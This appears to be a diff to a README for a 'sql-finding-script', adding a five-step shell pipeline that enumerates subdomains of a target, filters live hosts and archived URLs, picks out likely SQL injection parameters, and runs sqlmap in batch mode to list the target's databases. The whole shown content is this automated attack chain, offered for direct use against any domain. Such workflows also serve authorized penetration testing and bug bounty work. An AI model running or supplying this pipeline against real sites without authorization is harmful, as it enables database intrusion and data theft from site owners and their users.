@@ -1,5 +1,11 @@
 # sql-finding-script
 
+subfinder -d target.com | tee -a domains.txt
+2 cat domains.txt | httpx|tee -a urls-alive.txt
+3 cat urls-alive.txt | waybackurls |tee -a urls-check.txt
+4 gf sqli urls-check.txt >> sql.url
+5 sqlmap -m sql.url --dbs --batch
+
 
 
 #!/bin/bash
